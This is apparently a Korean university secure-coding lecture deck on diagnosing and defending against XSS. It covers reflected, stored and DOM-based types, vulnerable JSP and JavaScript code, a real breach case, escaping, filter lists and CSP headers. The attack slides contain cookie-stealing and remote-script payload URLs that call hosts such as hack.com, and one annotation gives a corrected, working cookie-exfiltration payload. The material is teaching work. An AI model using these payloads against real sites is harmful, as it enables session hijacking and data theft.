# 2025_강원대_시큐어코딩_7주차_2차시_vF

<!-- p.1 -->

XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

<!-- p.2 -->

📌
학습 목표
✅
XSS(크로스 사이트 스크립팅)의 개념과 유형을 이해한다.
✅
실제 XSS 공격 기법을 학습하고, 취약점 진단 방법을 익힌다.
✅
XSS 방어 기법을 적용하여 웹 애플리케이션 보안을 강화할 수 있다.

---

<!-- p.3 -->

📍
학습 내용
1. XSS 취약점 이해
2. XSS 취약점 진단
3. XSS 취약점 방어

---

<!-- p.4 -->

XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

<!-- p.5 -->

XSS(크로스 사이트 스크립팅) 이란?
XSS 개요
검증되지 않은 외부 입력 값을 웹 응답에 그대로 반영하여 악의적 스크립트가 실행되는 취약점
→ 사용자 브라우저에서 악성 코드가 동작해, 쿠키· 세션 등 민감 정보 탈취 가능
발생 원인
- 외부에서 입력된 사용자 입력 값을 검증하지 않고 그대로 응답에 반영
- DB에 저장된 데이터를 읽어서 출력할 때 DB에서 읽어온 값을 검증하지 않고 출력 값으로 사용
- 자바스크립트로 DOM구조를 조작하여 페이지를 변경하는 경우 변경되는 내용을 검증하지 않고 브라우저에 표시하는 경우
예상되는 피해
이 취약점으로 인해 해당 사용자 PC는 악성코드를 다운로드 받아 좀비 PC가 되거나,
사용자가 피싱 사이트로 접속되게 하거나, 사용자의 중요 정보를 공격자에게 전송하는 침해사고를 당할 수 있음

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
[그림] 오른쪽 위: 후드와 복면을 쓴 해커가 노트북 앞에 앉아 있고, 뒤의 모니터 화면에 "XSS <script>" 글자와 빨간 경고 폭발 아이콘(!)이 표시된 일러스트. 노트북에서 주사기 모양 아이콘이 화면 쪽으로 향함(악성 스크립트 주입을 상징).

---

<!-- p.6 -->

XSS 취약점 공격 흐름
1. 공격자
악성 스크립트 삽입(예: <script>evil('XSS');</script>)
2. 웹 애플리케이션
입력 값 검증 없이 페이지에 반영하거나 DB에 저장
3. 피해 사용자
페이지 접속 시 악성 스크립트가 브라우저에서 실행
→ 쿠키·세션 탈취, 임의 명령 수행 등 피해 발생

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
[그림] 오른쪽 흐름 도식 (상단 제목 "XSS", 아래에 왼쪽→오른쪽 진행 화살표)
- 공격자(복면 쓴 인물)의 노트북 화면: `<script> evil()` → (화살표) →
- 웹 애플리케이션(웃는 얼굴의 서버) 문서: `<script> evil() </script>` → (화살표) →
- 피해 사용자(화난 표정, 머리 위 빨간 폭발 표시)의 노트북 화면: `<script> evil()`
즉 공격자가 넣은 스크립트가 서버를 거쳐 피해자 브라우저에서 그대로 실행되는 1→2→3 단계를 그림으로 표현.

---

<!-- p.7 -->

XSS 취약점 유형
Reflected XSS
사용자 입력이 즉시 반영되어 페이지에 표시
검색창, URL 파라미터 등을 통해 스크립트가 반사되어 실행
Stored XSS
게시판, 댓글, 프로필 등 DB에 악성 스크립트가 저장되어 다수 사용자에게 전파
DOM 기반 XSS
클라이언트 측 스크립트(DOM 조작)에서 발생
location.hash, location.search 등 브라우저 객체를 통한 동적 스크립트 삽입

---

<!-- p.8 -->

XSS 취약점 공격 피해
세션 쿠키 탈취
자동 로그인, 권한 정보 등 노출
사용자 계정·개인정보 유출
폼에 입력된 민감 데이터(이메일, 전화번호, 카드번호 등) 탈취
브라우저 무단 제어
임의 스크립트 실행 → 가짜 폼 표시, 피싱 페이지로 이동, 내부 네트워크 스캔 등
기업 이미지 타격
보안 사고 발생 시 신뢰도 하락, 법적 책임 가능성

---

<!-- p.9 -->

XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

<!-- p.10 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – Reflected XSS

사용자가 요청한 값을 서버에서 검증하지 않고 응답으로 사용하는 경우 발생

[도식] 공격자(노트북) → 사용자(PC, 머리 위에 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① 이메일로 URL 전달 (공격자 → 사용자)
- ② URL을 클릭하여 요청 (사용자 → 서버)
- ③ 공격자의 Script 전송 (서버 → 사용자)

빨간 점선 박스 1 (공격자가 보낸 이메일 내용, 노란 화살표로 사용자에게 전달됨):

```html
고객님이 요청하신 새로운 제품이 입고 되었습니다.
확인해보세요.
<a href =http://a.com/1.do?name=<script src=
“http://hack.com/hook.js”/>확인</a>
```

빨간 점선 박스 2 (서버 응답 화면, 노란 화살표로 서버 → 사용자에게 돌아옴):

```html
<script src=‘http://hack.com/hook.js”/> 님 환영합니다.
```

→ name 파라미터 값이 검증 없이 "○○ 님 환영합니다." 응답에 그대로 반영되어, 사용자의 브라우저에서 hack.com의 hook.js가 로드·실행됨.

(※ 원문 표기 그대로 — 응답 박스의 따옴표가 여는 쪽 `‘`(작은 곡선 따옴표), 닫는 쪽 `”`(큰 곡선 따옴표)로 짝이 맞지 않고, 이메일 박스도 곡선 따옴표 `“ ”` 사용)
(※ 검증: 개념 설명용 축약 예시. 실제 HTML에서는 ① `<script .../>` 처럼 자기 닫기로 쓴 script 태그는 닫힌 것으로 인정되지 않아 `</script>`가 필요하고, ② 곡선 따옴표는 속성값 구분자로 인식되지 않으며, ③ href 값이 따옴표 없이 쓰여 `<`, 공백 등에서 끊기므로 실제 링크에는 `name=%3Cscript%20src%3D...%3E%3C%2Fscript%3E`처럼 URL 인코딩된 페이로드를 넣어야 함)

---

<!-- p.11 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – Reflected XSS

**안전하지 않은 코드** (빨간 라벨)

```jsp
// JSP VULNERABLE code to XSS reflected #FAIL
<% String customerID = request.getParameter("id"); %>
Customer ID: <%= customerID %>

// code in a VULNERABLE Servlet to XSS reflected #FAIL
out.writeln("you searched for: "+request.getParameter("q"));
```
(코드 이미지에서 `customerID`(두 곳)와 `"q"`의 q가 빨간색으로 강조됨 — 외부 입력이 그대로 출력되는 지점)

id나 q의 값이 다음과 같은 패턴의 값이 입력된다면 XSS 공격이 실행되게 된다.

```text
http://mywebsite.com/customers?id=1234'><script src=http://ha.ckers.org/xss.js></script>'
http://mywebsite.com/customers?id=1234"><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'%20+document.cookie</script>
```

(※ 검증: Python `urllib.parse.parse_qs`로 서버가 받는 id 값을 확인 — 첫 번째 URL은 `1234'><script src=http://ha.ckers.org/xss.js></script>'`가 그대로 전달되어 JSP 출력이 `Customer ID: 1234'><script src=http://ha.ckers.org/xss.js></script>'`가 됨 → 외부 스크립트 로드, 일치. 두 번째 URL은 쿼리스트링 디코딩 시 `%20`과 `+`가 모두 공백으로 바뀌어 `document.location='...cookie.cgi?'  document.cookie`가 되므로(Java `getParameter`도 동일하게 `+`→공백) 연결 연산자가 사라져 JS 문법 오류가 남. 실제로 쿠키를 붙이려면 `+`를 `%2B`로 인코딩해야 함 — 원문 예시는 OWASP 문서의 고전 예시를 그대로 옮긴 것)
(※ 원문 표기 그대로 — Java의 `PrintWriter`/`JspWriter`에는 `writeln` 메서드가 없음(`println`이 맞음). p.32 퀴즈에서는 `out.println(...)`으로 표기)

---

<!-- p.12 -->

XSS 공격 유형 및 기법 – Reflected XSS
Reflected XSS LAB 시연 영상

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

<!-- p.13 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – Stored XSS

공격자가 서버에 저장한 스크립트를 사용자가 열람하는 경우 스크립트가 다운로드 되어 사용자의 브라우저에서 실행

[도식] 공격자 / 서버 / 데이터베이스 / 사용자(PC 위에 빨간 폭발 모양 "Script 실행")

- ① Script 삽입 글 등록 (공격자 → 서버)
- ② Script 삽입 글 저장 (서버 → 데이터베이스)
- ③ 공격자의 글 열람 (사용자 → 서버)
- ④ 공격자의 Script 전송 (데이터베이스 → 서버 → 사용자)
- ⑤ 사용자 정보 획득 (사용자 → 공격자) — 옆의 빨간 점선 박스: **쿠키값전달** (노란 화살표로 공격자 쪽을 가리킴)

빨간 점선 박스(아래, 노란 화살표로 ① 등록 경로를 가리킴):

```html
게시물을 작성하여 DB에 저장
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

빨간 점선 박스(위, 노란 화살표로 사용자 쪽을 가리킴 — 사용자 브라우저에서 실행되는 스크립트):

```html
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

(※ 원문 표기 그대로 — 곡선 따옴표 `“`가 여닫는 쪽 모두 같은 모양)
(※ 검증: 개념 설명용 축약 예시. src 속성값은 문자열일 뿐 JavaScript로 평가되지 않으므로 `+document.cookie`가 쿠키 값으로 치환되지 않으며, `<script .../>` 자기 닫기도 HTML에서 인정되지 않음. 실제로 쿠키를 전송하는 형태는 예: `<script>new Image().src='http://hack.com/receive.do?param='+document.cookie</script>`)

---

<!-- p.14 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – Stored XSS

다음 서블릿 코드는 Stored XSS에 취약하다.

**안전하지 않은 코드** (빨간 라벨)

```java
final String id = httpRequest.getParameter ("id")        // parameter from the request
final String sql = "SELECT * FROM Customers WHERE CustomerID =?";
final PreparedStatement ps = con.prepareStatement (sql);
ps.setString (1, id);
ResultSet rs = ps.executeQuery ();
```

PreparedStatement는 SQL Injection을 예방하기는 하지만 XSS 취약점에 대해서는 예방책이 없다.
DB에서 읽어온 데이터를 체크하지 않고 그대로 HTML 페이지에 보내준다.

```java
out.writeln (<tr> <td> "+ rs.getString (" name ")+"</ td> <td> "+
                         rs.getString (" comment ")+"</ td></ tr> ");
```

(※ 검증: 바인딩 변수 `?`에 `setString(1, id)`로 값을 넣으므로 SQL 쿼리 구조는 `SELECT * FROM Customers WHERE CustomerID =?` 그대로 유지되어 SQL Injection은 방지됨 — 설명과 일치. 그러나 name/comment 컬럼에 저장된 `<script>...` 문자열은 이스케이프 없이 HTML로 출력되므로 Stored XSS 발생 — 설명과 일치)
(※ 원문 표기 그대로 — 컴파일되지 않는 축약 코드: 첫 줄 끝 `;` 누락, `out.writeln (` 뒤 여는 따옴표 누락(`("<tr><td>"+`가 맞음), `writeln`은 Java에 없는 메서드(`println`), `" name "`·`" comment "`처럼 컬럼명 앞뒤 공백, `</ td>`·`</ tr>`처럼 닫는 태그 안의 공백)

---

<!-- p.15 -->

XSS 공격 유형 및 기법 – Stored XSS
- Stored XSS LAB 시연 영상

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

<!-- p.16 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – DOM 기반 XSS

자바스크립트로 DOM 객체 정보를 사용하여 Document에 write를 수행하는 경우
스크립트가 사용자의 브라우저에서 실행

[도식] 사용자(PC, 머리 위 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① `http://a.com/hello.do` : 사용자 로그인 요청 (사용자 → 서버)
- ② `http://a.com/good.do?menu=요청처리함` : 초기 화면인 '요청처리함'으로 리다이렉트 (서버 → 사용자)
- ③ 공격자는 파악된 URL 내용을 변조하여 사용자가 링크를 클릭하도록 피싱메일 등으로 유도 (빨간 글씨)
- ④ `http://a.com/good.do?menu=<script src=http://hack.com/do.js/>` : 사용자가 악성 URL 클릭 (빨간 글씨, 사용자 → 서버)
- ⑤ 정상적으로 “요청처리함” 화면 표시 (서버 → 사용자)
- ⑤ (사용자 아래의 순환 화살표, 빨간 글씨) 자바스크립트로 URL의 일부인 menu 값을 document.write()로 화면에 출력하는 경우 브라우저에서 스크립트가 실행

→ 서버 응답 자체는 정상이지만, 클라이언트 측 스크립트가 URL의 menu 값을 DOM에 써 넣는 과정에서 스크립트가 실행됨.

(※ 원문 표기 그대로 — ⑤ 번호가 두 번 사용됨)
(※ 검증: `<script src=http://hack.com/do.js/>`에서 따옴표 없는 src 값은 공백이나 `>` 전까지이므로 `http://hack.com/do.js/`(끝에 `/` 포함)로 해석되고, 닫는 `</script>`가 없어 실제로는 동작이 불확실 — 개념 설명용 축약 예시)

---

<!-- p.17 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# XSS 공격 유형 및 기법 – DOM 기반 XSS

**안전하지 않은 코드** (빨간 라벨)

```html
<script>
   var  a= document.URL;
   a=decodeURIComponent(a);
   document.write(a.substring(a.indexOf(“message=“)+8, a.length);
</script>
```

해당 스크립트는 메시지 매개변수의 값을 추출하기 위해
URL 매개변수에서 message= 의 값으로 전달되는 값을 추출하여
HTML 에 추가하여 사용자에게 보여준다.

URL 값이 다음과 같다면 공격자가 의도한 스크립트가 해당 브라우저에 실행된다.

```text
http://example.com/error.jsp?message=<script>alert('xss');</script>
```
(이 URL은 슬라이드에서 빨간 글씨로 강조)

(※ 검증: Python으로 동작 재현 — `len("message=") = 8`이므로 `indexOf("message=")+8`은 값의 시작 위치가 맞고, 추출 결과는 `<script>alert('xss');</script>`. 브라우저가 `<`, `>`를 `%3C`, `%3E`로 인코딩해 document.URL에 넣더라도 `decodeURIComponent`로 다시 복원되므로 document.write로 그대로 삽입되어 실행됨 — 설명과 일치)
(※ 원문 표기 그대로 — `“message=“`에 곡선 따옴표가 쓰여 있고 `document.write(` 의 닫는 괄호 `)`가 하나 부족함. 실제 코드라면 `document.write(a.substring(a.indexOf("message=")+8, a.length));`)

---

<!-- p.18 -->

XSS 공격 유형 및 기법 – DOM 기반 XSS
- DOM 기반 XSS 시연 영상

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

<!-- p.19 -->

사고 사례

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
[왼쪽 이미지] 경향신문(경제 섹션) 기사 캡처 — 제목 "대성학원·시대인재 해킹…수험생 11만명 정보 유출", 입력 2024.03.28 21:07.
(기사 본문 요약 — 저작권 보호를 위해 원문 대신 요약)
- 두 회사 모두 해킹으로 수강생 개인정보가 유출되었고 사고 후 대응도 미흡했다는 내용.
- **빨간 박스로 강조된 부분**: 디지털대성은 1월 12~16일 공격을 받음. 해커는 먼저 다른 곳에서 확보한 아이디·비밀번호를 무작위로 대입하는 크리덴셜 스터핑으로 회원 A의 계정을 탈취하고, 그 계정으로 불법이용 신고 게시판에 악성 스크립트가 든 글을 올림. 직원이 이 글을 열람하면서 스크립트가 실행되는 XSS 공격이 일어나 내부 보안 정보가 유출됨.
- 이후 부분: 이 공격으로 디지털대성 회원 약 9만5000명의 개인정보가 유출되었고, 보안시스템이 있었지만 급증한 로그인 시도를 탐지하지 못했으며, 유출 사실 인지 후 72시간이 지나서야 알렸다는 내용.

[오른쪽 도식] < 개인정보 유출 경위 >
- 크리덴셜 스터핑 공격 (점선 박스): 해커 → ① 무작위 로그인 시도 ('24. 1. 12. 12:01) → 로그인 화면(아이디/비밀번호 입력, 네이버·카카오 로그인 버튼) → 회원 A 계정 탈취
- XSS 공격 (점선 박스): 회원 A → ② 악성 스크립트 삽입 ('24. 1. 15. 17:05) → 불법이용 신고 게시판 → ③ 게시글 열람 ('24. 1. 16. 09:04, 직원 A, B) → ④ 직원 A,B 세션 탈취 → 직원 A, B 세션
- 직원 A, B 세션으로 → ⑤ 서비스 접속 ('24. 1. 16. 11:18 / '24. 1. 16. 14:10) → 관리용 웹 서비스 → ⑥ 개인정보 열람 (문서 아이콘)

→ 계정 탈취 후 Stored XSS로 관리자(직원) 세션을 훔쳐 관리 시스템에 접속한 실제 사례.

---

<!-- p.20 -->

XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

<!-- p.21 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# 입출력 값 검증 및 필터링

**제한적인 입력 값 허용**
클라이언트 프로그램과 서버 애플리케이션에서 HTTP 헤더, 쿠키, 쿼리 스트링, 폼 필드, 히든 필드 등의 모든 인자들에 대해
허용된 유형의 데이터만을 받아들이도록 정규식을 이용하여 제한된 입력 값을 받아서 처리하도록 한다.

**제한적인 출력 값 허용**
입력 값이나 DB에서 조회한 결과 값을 응답으로 내보내기전에
XssFilter를 적용하여 동적으로 스크립트가 실행될 수 있는 요소들은 HTML인코딩을 적용하여 출력한다.

• 필터링 또는 변환되어야 하는 특수문자들

| 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding |
|---|---|---|---|---|---|---|---|---|
| ' | %27 | &#x27; &apos; | [ | %5b | &#x5b; | % | %25 | &#x25; |
| " | %22 | &#x22; &quot; | ] | %5d | &#x5d; | & | %26 | &#x26; &amp; |
| : | %3a | &#x3a; | { | %7b | &#x7b; | ? | %3f | &#x3f; |
| ; | %3b | &#x3b; | } | %7d | &#x7d; | ! | %21 | &#x21; |
| ( | %28 | &#x28; | ` | %60 | &#x60; | @ | %40 | &#x40; |
| ) | %29 | &#x29; | = | %3d | &#x3d; | * | %2a | &#x2a; |
| < | %3c | &#x3c; &lt; | # | %23 | &#x23; | TAB | %09 | &#x09; |
| > | %3e | &#x3e; &gt; | $ | %24 | &#x24; | \| | %7c | &#x7c; |

(※ 검증: Python으로 24개 문자 모두 확인 — `urllib.parse.unquote`(URL 인코딩)와 `html.unescape`(16진 숫자 참조·이름 참조) 결과가 각 원문자와 일치. 참고로 `&apos;`는 HTML5/XML에서 정의된 이름 참조로, 구형 HTML4 브라우저 호환이 필요하면 `&#x27;` 사용)

---

<!-- p.22 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# 입출력 값 검증 및 필터링

차단되어야 하는 태그들

| | | |
|---|---|---|
| `<script>` | `<object>` | `<img>` |
| `<javascript>` | `<marquee>` | `<embed>` |
| `<vbscript>` | `<qss>` | `<table>` |
| `<livescript>` | `<body>` | `<isindex>` |
| `<iframe>` | `<input>` | `<meta>` |
| `<frameset>` | `<form>` | `<http-equiv>` |
| `<mocha>` | `<div>` | `<xss>` |
| `<applet>` | `<style>` | `<href>` |

(※ 검증: 원문 표의 일부는 실제 HTML 태그가 아님 — `javascript`, `vbscript`, `livescript`, `mocha`는 `javascript:` 같은 URL 스킴(스크립트 언어 이름), `http-equiv`(meta 태그 속성)와 `href`(a 태그 등의 속성)는 속성 이름, `<qss>`, `<xss>`는 표준 태그가 아님. 필터링 키워드 목록으로 이해하면 됨)

---

<!-- p.23 -->

HTML 엔티티 이스케이프 처리
HTML 엔티티 이스케이프(Entity Escape) 란?
HTML 문서에서 특수 문자가 브라우저에 의해 태그나 코드로 해석되지 않도록,
해당 문자를 엔티티 코드(예: < → &lt;)로 변환하는 기법
XSS 공격 방어 방법
사용자 입력에 포함된 <script> 태그 등 악의적인 스크립트가 실행되지 않도록 보호
서버와 클라이언트 모두에서 출력 전에 반드시 이스케이프 처리 필요
적용해야 하는 위치
동적 콘텐츠 출력 시, 특히 사용자 입력을 직접 HTML에 삽입하는 경우

---

<!-- p.24 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# HTML 엔티티 이스케이프 처리

**취약한 코드 (이스케이프 미적용)**
사용자 입력을 그대로 HTML에 삽입하여 XSS 공격에 노출

**예시**

```javascript
// 사용자 입력을 가져와서 그대로 innerHTML에 할당 (취약)
var userInput = getUserInput();
document.getElementById("content").innerHTML = userInput;
```

**공격 시나리오**
사용자가 <script>alert('XSS');</script>와 같은 입력을 전달하면,
해당 스크립트가 실행되어 공격자가 쿠키 탈취, 세션 하이재킹 등 다양한 공격을 수행할 수 있음

(※ 검증: HTML5 명세상 innerHTML로 삽입된 `<script>` 요소는 실행되지 않음. 따라서 이 시나리오의 `<script>alert('XSS');</script>` 입력 자체는 실행되지 않으며, 실제 공격은 `<img src=x onerror=alert('XSS')>`처럼 이벤트 핸들러를 이용한 입력으로 이루어짐 — innerHTML이 XSS에 취약하다는 결론은 맞음)

---

<!-- p.25 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# HTML 엔티티 이스케이프 처리

**안전한 코드 구현**
- 방법 1: 사용자 입력 이스케이프 함수 적용
  - 사용자 입력을 HTML 엔티티로 변환하는 함수를 사용하여 안전하게 출력
- 방법 2: textContent 속성 사용
  - DOM에 텍스트만 삽입하여 브라우저가 HTML로 해석하지 않도록 함

**효과**
이스케이프 처리를 통해 악의적인 스크립트가 실행되지 않으며, 안전한 텍스트로 표시됨

```javascript
function escapeHtml(text) {
    return text.replace(/&/g, "&amp;")
               .replace(/</g, "&lt;")
               .replace(/>/g, "&gt;")
               .replace(/"/g, "&quot;")
               .replace(/'/g, "&#039;");
}

var userInput = getUserInput(); // 예: "<script>alert('XSS');</script>"
var safeInput = escapeHtml(userInput);
document.getElementById("content").innerHTML = safeInput;
```
< 방법 1: 사용자 입력 이스케이프 함수 적용 >

```javascript
var userInput = getUserInput(); // 사용자 입력
document.getElementById("content").textContent = userInput;
```
< 방법 2: textContent 속성 사용 >

(※ 검증: Python으로 같은 치환 순서를 재현 — 입력 `<script>alert('XSS');</script>` → `&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;`, 다시 unescape하면 원문과 동일하므로 화면에는 글자 그대로 표시되고 실행되지 않음 — 일치. `&`를 가장 먼저 치환해야 이후에 만든 `&lt;` 등이 `&amp;lt;`로 이중 변환되지 않음 — 원문 순서가 올바름)

---

<!-- p.26 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# Spring Web MVC에서 입출력 필터링

• Spring Web MVC 프레임워크를 사용하는 경우 입력 값 필터링 정책 적용

[도식] Spring MVC 요청 처리 흐름과 필터링 지점

```text
Client --User Request-->  Filter  -->  DispatcherServlet  <-->  HandlerMapping
Client <--User Response-- Filter  <--  DispatcherServlet
                                       DispatcherServlet  <-->  Handler Interceptor  <-->  Handler(Controller)
                                                                                           ├ Data binding
                                                                                           ├ Validation
                                                                                           │   ↓
                                                                                           └ Business Logic
                                                                                           HandlerExceptionResolver
                                       DispatcherServlet  -->   View Resolver
                                       DispatcherServlet  -->   View
```

필터링 수행 위치(파란 테두리 말풍선):
- 입력 값에 대해 필터링 수행 → **Filter**
- 입력 값에 대해 Interceptor에서 필터링 수행 → **Handler Interceptor**
- 입력 값에 대해 Controller Validator 에서 필터링 수행 → Handler(Controller) 안의 **Validation**
- 출력 값에 대해 Controller 에서 필터링 수행 → **Handler(Controller)** (Business Logic 결과)
- 출력 값에 대해 View 에서 필터링 수행 → **View**

→ 요청은 Client → Filter → DispatcherServlet → HandlerMapping으로 처리할 핸들러를 찾고 → Handler Interceptor → Controller(Data binding → Validation → Business Logic)를 거치며, 응답은 역방향으로 Interceptor → DispatcherServlet → View Resolver/View → Filter → Client로 반환됨. 예외는 HandlerExceptionResolver가 처리.

---

<!-- p.27 -->

CSP(Content-Security-Policy) 적용
HTTP 응답 헤더 CSP를 통해 설정함
XSS 공격 방어 효과
- 인라인 스크립트 차단
기본적으로 'unsafe-inline' 없이 스크립트 실행을 제한하여, 악의적으로 삽입된 인라인 코드가 실행되지 않도록 함
- 신뢰하는 스크립트만 허용
신뢰할 수 있는 도메인에서 제공하는 스크립트만 로드하게 하여, 외부 공격자의 스크립트 주입 차단
- 동적 코드 실행 방지
eval()이나 new Function() 같은 동적 코드 실행을 제한할 수 있음
XSS 방어와 CSP의 연계
CSP는 XSS 취약점이 존재하더라도, 악의적 스크립트 실행을 실질적으로 차단하여 추가적인 방어층을 제공

---

<!-- p.28 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# CSP(Content-Security-Policy) 적용

• 예시: 웹 서버별 CSP 헤더 설정

• Apache 예시: httpd.conf 또는 .htaccess 내에 설정

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';"
```

• Nginx 예시: nginx.conf 또는 해당 서버 블록 내에 설정

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';";
```

(※ 검증: Python으로 정책 문자열을 `;` 기준으로 파싱 — `default-src 'self'`, `script-src 'self' https://trusted.cdn.com`, `object-src 'none'` 3개 지시어와 끝의 빈 항목(마지막 `;`, 허용됨). Apache는 `Header set 이름 "값"`(mod_headers 필요), Nginx는 `add_header 이름 "값";`으로 지시어 끝에 `;`가 붙는 형식 — 두 설정 모두 문법 일치. `'unsafe-inline'`이 없으므로 인라인 스크립트가 차단됨)

---

<!-- p.29 -->

요약 정리
- XSS는 검증되지 않은 입력 값으로 인해, 브라우저에서 악성 스크립트가 실행되는 취약점이다.
- Reflected, Stored, DOM 기반 XSS로 분류되며, 세션 탈취나 브라우저 조작이 가능하다.
- 특히, 게시판이나 댓글 등에 악성 코드가 삽입된 Stored XSS는 다수 사용자에게 피해를 줄 수 있다.
- 입출력 값 검증, HTML 이스케이프, CSP를 적용해 XSS를 효과적으로 막을 수 있다.
- 다단계 방어와 자동화 테스트로 재발을 방지해야 한다.

---

<!-- p.30 -->

참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

<!-- p.31 -->

감사합니다.

---

<!-- p.32 -->

<!-- 아래는 슬라이드 원본(도식·표·이미지 포함)을 보고 다시 옮긴 내용 -->
# 퀴즈

1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
   1) HTML 엔티티 이스케이프로 <script>를 무해한 텍스트로 변환
   2) CSP를 적용해 악성 스크립트 로드를 제한
   3) 입력값 필터링으로 < > 같은 특수문자 차단
   4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증

2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
   1) `out.println("You searched for: " + request.getParameter("q"));`
   2) `response.setHeader("Content-Security-Policy", "default-src 'self'");`
   3) `<input type="hidden" name="_csrf" value="...">`
   4) `textContent = escapeHtml(userInput);`

3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
   (영어 대문자 3글자)
   (            )

---

<!-- p.33 -->

퀴즈 정답
1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
CSRF 토큰은 주로 CSRF 공격 방어 기법이며, XSS 방어와는 직접 관련이 없습니다.
2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
1) out.println("You searched for: " + request.getParameter("q"));
사용자 입력값을 검증 없이 그대로 출력하면 XSS 공격이 발생할 수 있습니다.
3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
(영어 대문자 3글자)
( DOM )

<!-- 아래는 슬라이드 이미지·도표에서 판독한 내용 -->
(정답 표시: 1번의 "4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증", 2번의 "1) out.println(...)" 코드, 3번의 "DOM"이 빨간 글씨로 강조됨)
